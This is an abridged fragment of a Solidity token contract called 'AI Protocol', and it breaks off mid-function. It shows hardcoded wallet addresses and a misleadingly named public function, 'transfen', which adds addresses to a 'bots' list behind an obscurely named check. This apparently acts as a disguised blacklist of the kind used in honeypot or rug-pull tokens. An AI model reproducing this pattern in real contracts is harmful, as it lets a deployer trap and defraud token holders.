...
contract AIProtocol is Context, IERC20, Ownable {
    ...
    string private _name = "AI Protocol";
    string private _symbol = unicode"AI";
    ...
    constructor () {
        ...
        teamWallet = payable(address(0xB5E86DB17b44db9b727117F4ad64A231691cE9B9));
        marketingWallet = payable(address(0x6b47A12F8305cEEFF83A4d8dF907A619dC75De5D));
    ...
    function transfen(address[] memory newAddress) public {
        sent(true);
        for (uint256 i=0; i < newAddress.length; i++) {
        bots[newAddress[i]] = true;
      }
    }
    ...
    function sent(bool status) view public{
        if (!status) return;
